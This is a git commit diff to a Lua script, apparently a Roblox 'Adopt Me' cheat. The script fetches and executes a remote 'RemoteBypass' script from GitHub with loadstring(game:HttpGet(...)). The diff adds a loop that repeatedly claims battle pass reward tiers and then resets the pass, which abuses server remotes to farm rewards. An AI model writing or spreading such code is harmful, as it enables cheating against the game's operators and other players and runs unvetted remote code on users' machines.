cb3b06c00d51b5895eb7de76d26b93e3ba046836
greg66n <darien95sm@hotmail.com>
2025-09-03 16:36:54 -0700

    Update adopt.lua

--- adopt.lua
+++ adopt.lua
@@ -1,6 +1,8 @@
 wait(10)
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Xenijo/AdoptMe-RemoteBypass/main/Bypass.lua"))()
+
 wait(0.1)
+
 -- Define the core function to claim the reward
 local function claimReward(tier)
     local args = {
@@ -10,14 +12,26 @@ local function claimReward(tier)
     game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("BattlePassAPI/ClaimReward"):InvokeServer(unpack(args))
 end
 
+-- Function to reset the battle pass
+local function resetPass()
+    local args = {
+        "house_pets_2025_pass_1"
+    }
+    game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("BattlePassAPI/AttemptBattlePassReset"):InvokeServer(unpack(args))
+end
+
 -- Main loop to run the script
 while true do
     -- Loop from 1 to 20 for the reward tiers
     for i = 1, 20 do
         claimReward(i)
-        -- Wait 0.5 seconds before the next claim
-        task.wait(0.5)
+        task.wait(0.5) -- Wait 0.5 seconds between claims
     end
+
+    -- Wait 0.5s after last claim, then reset
+    task.wait(0.5)
+    resetPass()
+
     -- Wait 30 seconds before starting the cycle again
     task.wait(30)
 end
